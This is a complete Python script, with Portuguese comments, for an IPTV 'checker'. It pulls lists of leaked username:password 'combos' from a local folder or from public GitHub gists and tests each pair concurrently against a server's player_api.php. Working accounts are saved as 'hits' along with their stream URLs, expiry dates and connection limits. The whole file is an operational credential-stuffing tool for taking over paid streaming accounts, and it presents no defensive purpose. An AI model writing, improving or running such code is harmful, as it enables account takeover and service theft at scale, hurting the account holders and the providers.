#!/usr/bin/env python3
"""
Verificador IPTV Otimizado - Versão Simplificada
Suporte a: arquivo local, gist GitHub e servidor único
"""

import asyncio
import aiohttp
import aiofiles
import time
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Tuple, Optional
import argparse

class IPTVChecker:
    def __init__(self, max_concurrent: int = 30, timeout: int = 8):
        """
        Verificador IPTV simplificado
        
        Args:
            max_concurrent: Número máximo de requisições simultâneas
            timeout: Timeout para requisições HTTP em segundos
        """
        self.max_concurrent = max_concurrent
        self.timeout = timeout
        self.session = None
        self.total_hits = 0
        self.semaphore = asyncio.Semaphore(max_concurrent)
        self.tested = 0
        self.total_tests = 0
        
        # Cria pastas necessárias
        Path('./combo').mkdir(exist_ok=True)
        Path('./hits').mkdir(exist_ok=True)
        
    async def get_user_gists(self, username: str) -> List[Dict]:
        """Busca gists públicos de um usuário GitHub"""
        try:
            url = f"https://api.github.com/users/{username}/gists"
            
            async with self.session.get(url) as response:
                if response.status == 404:
                    print(f"❌ Usuário '{username}' não encontrado")
                    return []
                elif response.status != 200:
                    print(f"❌ Erro ao buscar gists: HTTP {response.status}")
                    return []
                
                gists_data = await response.json()
                
                if not gists_data:
                    print(f"📭 Usuário '{username}' não possui gists públicos")
                    return []
                
                gists = []
                for gist in gists_data:
                    if not gist or 'files' not in gist:
                        continue
                        
                    gist_info = {
                        'id': gist.get('id', ''),
                        'description': gist.get('description') or 'Sem descrição',
                        'created_at': gist.get('created_at', ''),
                        'files': list(gist.get('files', {}).keys()),
                        'raw_urls': {}
                    }
                    
                    # URLs raw dos arquivos
                    for filename, file_info in gist.get('files', {}).items():
                        if file_info and 'raw_url' in file_info:
                            gist_info['raw_urls'][filename] = file_info['raw_url']
                    
                    gists.append(gist_info)
                
                return gists
                
        except Exception as e:
            print(f"❌ Erro ao buscar gists: {e}")
            return []
    
    def identify_combo_files(self, gist: Dict) -> List[Dict]:
        """Identifica arquivos que podem ser combos"""
        combo_files = []
        
        for filename, raw_url in gist['raw_urls'].items():
            is_combo = (
                filename.lower().endswith('.txt') or
                'combo' in filename.lower() or
                'credential' in filename.lower() or
                'login' in filename.lower() or
                'user' in filename.lower()
            )
            
            if is_combo:
                combo_files.append({
                    'filename': filename,
                    'raw_url': raw_url
                })
        
        return combo_files

    async def download_combo_from_url(self, url: str) -> List[Tuple[str, str]]:
        """Baixa combo de uma URL"""
        try:
            print(f"🌐 Baixando combo de: {url}")
            
            async with self.session.get(url, timeout=aiohttp.ClientTimeout(total=30)) as response:
                if response.status != 200:
                    print(f"❌ Erro ao baixar combo: HTTP {response.status}")
                    return []
                
                content = await response.text()
                
            credentials = []
            for line in content.strip().split('\n'):
                line = line.strip()
                if ':' in line and line:
                    parts = line.split(':', 1)
                    if len(parts) == 2:
                        username = parts[0].strip()
                        password = parts[1].strip()
                        if username and password:
                            credentials.append((username, password))
            
            print(f"✅ {len(credentials)} credenciais carregadas")
            return credentials
            
        except Exception as e:
            print(f"❌ Erro ao baixar combo: {e}")
            return []
    
    async def load_credentials(self, file_path: str) -> List[Tuple[str, str]]:
        """Carrega credenciais do arquivo"""
        try:
            async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
                content = await f.read()
                
            credentials = []
            for line in content.strip().split('\n'):
                if ':' in line:
                    parts = line.strip().split(':', 1)
                    if len(parts) == 2:
                        credentials.append((parts[0], parts[1]))
            
            return credentials
        except Exception as e:
            print(f"❌ Erro ao carregar credenciais: {e}")
            return []
    
    async def check_credential(self, server: str, username: str, password: str) -> Optional[Dict]:
        """Verifica uma credencial em um servidor"""
        async with self.semaphore:
            try:
                base_url = f"http://{server}/player_api.php"
                auth_params = f"username={username}&password={password}"
                user_info_url = f"{base_url}?{auth_params}"
                
                async with self.session.get(user_info_url, timeout=self.timeout) as response:
                    if response.status != 200:
                        return None
                    
                    data = await response.json()
                    user_info = data.get('user_info')
                    
                    if not user_info or user_info.get('auth') != 1 or user_info.get('status') == 'Expired':
                        return None
                
                # Busca categorias
                categories = []
                try:
                    categories_url = f"{base_url}?{auth_params}&action=get_live_categories"
                    async with self.session.get(categories_url, timeout=self.timeout) as cat_response:
                        if cat_response.status == 200:
                            cat_data = await cat_response.json()
                            if isinstance(cat_data, list):
                                categories = [cat.get('category_name', '').upper() for cat in cat_data if cat.get('category_name')]
                except Exception:
                    pass
                
                return {
                    'server': server,
                    'user_info': user_info,
                    'categories': categories
                }
                
            except Exception:
                return None
            finally:
                self.tested += 1
                if self.tested % 50 == 0:
                    progress = (self.tested / self.total_tests) * 100
                    print(f"\r🔍 Progresso: {progress:.1f}% ({self.tested}/{self.total_tests}) | Hits: {self.total_hits}", end='', flush=True)
    
    def format_hit_data(self, result: Dict) -> str:
        """Formata dados do hit"""
        user_info = result['user_info']
        server = result['server']
        categories = result['categories']
        
        # Calcula expiração
        try:
            exp_date = datetime.fromtimestamp(int(user_info.get('exp_date', 0)))
            days_remaining = (exp_date - datetime.now()).days
            days_text = 'ilimitado' if days_remaining < 0 else f'{days_remaining} dias'
            exp_date_str = exp_date.strftime('%d/%m/%Y')
        except:
            exp_date_str = 'N/A'
            days_text = 'N/A'
        
        formatted_categories = ' | '.join(categories) if categories else 'N/A'
        
        return f"""━━━━━━━━━━━━━━━━━━━━━
✨ IPTV HIT ENCONTRADO ✨
━━━━━━━━━━━━━━━━━━━━━

🌐 HOST: http://{server}

👤 USUÁRIO: {user_info.get('username', 'N/A')}
🔑 SENHA: {user_info.get('password', 'N/A')}

📅 EXPIRA: {exp_date_str} ({days_text})
🔗 CONEXÕES ATIVAS: {user_info.get('active_cons', 'N/A')}
⚙️ CONEXÕES MÁXIMAS: {user_info.get('max_connections', 'N/A')}
🛠️ STATUS: {user_info.get('status', 'N/A')}

🎵 M3U:
http://{server}/get.php?username={user_info.get('username', '')}&password={user_info.get('password', '')}&type=m3u_plus

📺 CATEGORIAS:
{formatted_categories}

━━━━━━━━━━━━━━━━━━━━━"""
    
    async def save_hit(self, result: Dict):
        """Salva hit no arquivo"""
        server = result['server']
        formatted_server = server.replace('.', '_').replace(':', '_').replace('/', '_')
        file_path = Path('./hits') / f"{formatted_server}.txt"
        
        formatted_data = self.format_hit_data(result)
        
        async with aiofiles.open(file_path, 'a', encoding='utf-8') as f:
            await f.write(formatted_data + '\n\n')
        
        self.total_hits += 1
        username = result['user_info'].get('username', 'N/A')
        print(f"\n✅ HIT! {username}@{server} (Total: {self.total_hits})")
    
    async def run(self, combo_source: str, server: str, is_url: bool = False):
        """Executa a verificação"""
        # Configura sessão HTTP
        connector = aiohttp.TCPConnector(limit=self.max_concurrent)
        timeout = aiohttp.ClientTimeout(total=self.timeout)
        self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)
        
        try:
            # Carrega credenciais
            if is_url:
                credentials = await self.download_combo_from_url(combo_source)
            else:
                print(f"📂 Carregando credenciais de {combo_source}...")
                credentials = await self.load_credentials(combo_source)
            
            if not credentials:
                print("❌ Nenhuma credencial válida encontrada")
                return
            
            print(f"✅ {len(credentials)} credenciais carregadas")
            
            # Limpa servidor
            clean_server = server.replace('http://', '').replace('https://', '').rstrip('/')
            
            self.total_tests = len(credentials)
            print(f"\n🚀 Testando {len(credentials)} credenciais em {clean_server}")
            
            start_time = time.time()
            
            # Processa credenciais em lotes
            batch_size = 100
            for i in range(0, len(credentials), batch_size):
                batch = credentials[i:i + batch_size]
                tasks = [self.check_credential(clean_server, username, password) for username, password in batch]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for result in results:
                    if isinstance(result, dict) and result:
                        await self.save_hit(result)
            
            # Relatório final
            elapsed_time = time.time() - start_time
            print(f"\n\n✅ Concluído em {elapsed_time:.1f}s")
            print(f"📊 Total testado: {len(credentials)} credenciais")
            print(f"🎯 Hits encontrados: {self.total_hits}")
            
            if self.total_hits > 0:
                formatted_server = clean_server.replace('.', '_').replace(':', '_').replace('/', '_')
                print(f"💾 Resultados salvos em './hits/{formatted_server}.txt'")
            
        finally:
            await self.session.close()

def get_combo_files() -> List[str]:
    """Lista arquivos .txt na pasta combo"""
    combo_path = Path('./combo')
    if not combo_path.exists():
        combo_path.mkdir(exist_ok=True)
        return []
    
    return [f.name for f in combo_path.iterdir() if f.suffix == '.txt']

async def interactive_mode():
    """Modo interativo simplificado"""
    print("🚀 Verificador IPTV - Versão Otimizada")
    
    # Escolha do combo
    print("\nOpções de combo:")
    print("  1. Arquivo local (pasta ./combo)")
    print("  2. GitHub Gist")
    
    while True:
        try:
            combo_choice = int(input("\nEscolha (1-2): "))
            if combo_choice in [1, 2]:
                break
            print("❌ Opção inválida!")
        except ValueError:
            print("❌ Digite um número válido!")
    
    combo_source = None
    is_url = False
    
    if combo_choice == 1:
        # Arquivo local
        combo_files = get_combo_files()
        if not combo_files:
            print("❌ Pasta './combo' vazia")
            print("💡 Adicione arquivos .txt com credenciais na pasta ./combo")
            return
        
        print("\nArquivos disponíveis:")
        for i, file in enumerate(combo_files, 1):
            try:
                with open(f"./combo/{file}", 'r', encoding='utf-8') as f:
                    lines = len([line for line in f if ':' in line.strip()])
                print(f"  {i}. {file} ({lines} credenciais)")
            except:
                print(f"  {i}. {file}")
        
        while True:
            try:
                choice = int(input(f"\nEscolha um arquivo (1-{len(combo_files)}): ")) - 1
                if 0 <= choice < len(combo_files):
                    combo_source = f"./combo/{combo_files[choice]}"
                    break
                print("❌ Opção inválida!")
            except ValueError:
                print("❌ Digite um número válido!")
    
    else:
        # GitHub Gist
        username = input("\nUsuário GitHub (ex: dwkeka): ").strip()
        if not username:
            print("❌ Nome de usuário obrigatório")
            return
        
        # Busca gists
        temp_checker = IPTVChecker()
        connector = aiohttp.TCPConnector(limit=10)
        temp_checker.session = aiohttp.ClientSession(connector=connector)
        
        try:
            print(f"🔍 Buscando gists de '{username}'...")
            gists = await temp_checker.get_user_gists(username)
            
            if not gists:
                return
            
            # Lista gists
            print(f"\nGists encontrados ({len(gists)}):")
            for i, gist in enumerate(gists, 1):
                desc = gist['description'][:50] + '...' if len(gist['description']) > 50 else gist['description']
                files_list = ', '.join(gist['files'])
                print(f"  {i}. {desc}")
                print(f"     📁 {files_list}")
            
            # Seleção do gist
            while True:
                try:
                    gist_choice = int(input(f"\nEscolha um gist (1-{len(gists)}): ")) - 1
                    if 0 <= gist_choice < len(gists):
                        selected_gist = gists[gist_choice]
                        break
                    print("❌ Opção inválida!")
                except ValueError:
                    print("❌ Digite um número válido!")
            
            # Identifica arquivos de combo
            combo_files = temp_checker.identify_combo_files(selected_gist)
            
            if not combo_files:
                # Mostra todos os arquivos
                all_files = list(selected_gist['raw_urls'].items())
                print("\nArquivos disponíveis:")
                for i, (filename, _) in enumerate(all_files, 1):
                    print(f"  {i}. {filename}")
                
                while True:
                    try:
                        file_choice = int(input(f"\nEscolha um arquivo (1-{len(all_files)}): ")) - 1
                        if 0 <= file_choice < len(all_files):
                            combo_source = all_files[file_choice][1]
                            is_url = True
                            break
                        print("❌ Opção inválida!")
                    except ValueError:
                        print("❌ Digite um número válido!")
            
            elif len(combo_files) == 1:
                combo_source = combo_files[0]['raw_url']
                is_url = True
                print(f"✅ Usando: {combo_files[0]['filename']}")
            
            else:
                print("\nArquivos de combo:")
                for i, combo_file in enumerate(combo_files, 1):
                    print(f"  {i}. {combo_file['filename']}")
                
                while True:
                    try:
                        file_choice = int(input(f"\nEscolha (1-{len(combo_files)}): ")) - 1
                        if 0 <= file_choice < len(combo_files):
                            combo_source = combo_files[file_choice]['raw_url']
                            is_url = True
                            break
                        print("❌ Opção inválida!")
                    except ValueError:
                        print("❌ Digite um número válido!")
        
        finally:
            await temp_checker.session.close()
    
    # Servidor
    server = input("\nServidor (ex: http://exemplo.com): ").strip()
    if not server:
        print("❌ Servidor obrigatório")
        return
    
    # Configurações
    try:
        max_concurrent = input("Requisições simultâneas (30): ").strip()
        max_concurrent = int(max_concurrent) if max_concurrent else 30
    except ValueError:
        max_concurrent = 30
    
    try:
        timeout = input("Timeout em segundos (8): ").strip()
        timeout = int(timeout) if timeout else 8
    except ValueError:
        timeout = 8
    
    print(f"\n📋 Combo: {combo_source}")
    print(f"🌐 Servidor: {server}")
    input("Pressione Enter para iniciar...")
    
    checker = IPTVChecker(max_concurrent=max_concurrent, timeout=timeout)
    await checker.run(combo_source, server, is_url=is_url)

def main():
    """Função principal"""
    parser = argparse.ArgumentParser(description='Verificador IPTV Otimizado')
    parser.add_argument('--combo', help='Arquivo de credenciais')
    parser.add_argument('--combo-url', help='URL do combo')
    parser.add_argument('--server', help='Servidor para testar')
    parser.add_argument('--concurrent', type=int, default=30, help='Requisições simultâneas')
    parser.add_argument('--timeout', type=int, default=8, help='Timeout em segundos')
    parser.add_argument('--interactive', action='store_true', help='Modo interativo')
    
    args = parser.parse_args()
    
    if args.interactive or (not args.combo and not args.combo_url) or not args.server:
        asyncio.run(interactive_mode())
    else:
        async def run_with_args():
            checker = IPTVChecker(max_concurrent=args.concurrent, timeout=args.timeout)
            combo_source = args.combo_url or args.combo
            is_url = bool(args.combo_url)
            await checker.run(combo_source, args.server, is_url=is_url)
        
        asyncio.run(run_with_args())

if __name__ == "__main__":
    main()